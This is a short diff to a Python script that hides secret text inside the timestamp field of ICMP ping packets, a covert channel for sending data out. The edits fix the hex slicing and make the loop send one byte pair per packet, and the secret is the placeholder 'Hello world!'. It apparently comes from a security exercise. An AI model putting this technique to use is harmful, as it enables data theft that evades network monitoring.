@@ -7,7 +7,7 @@ def build_ping_packet(dst_ip, identifier, sequence_number, byte):
     now = time.time()
     seconds = int(now)
     microseconds = int((now - seconds) * 1_000_000)
-    microseconds_hex = hex(microseconds)[2:-1] + byte
+    microseconds_hex = hex(microseconds)[2:-2] + byte
     malicious_mircoseconds = int(microseconds_hex, 16)
 
     # Create timestamp (8 bytes) - seconds and microseconds
@@ -35,7 +35,8 @@ if __name__ == "__main__":
     secretText = "Hello world!" # Change secret text here
     secretText_hex = secretText.encode('utf-8').hex()
 
-    for byte in secretText_hex: 
+    for i in range(0, len(secretText_hex) - 1, 2):
+        byte = secretText_hex[i:i+2] 
         # Build packet
         icmp_seq += 1   
         pkt = build_ping_packet(target, icmp_id, icmp_seq, byte)
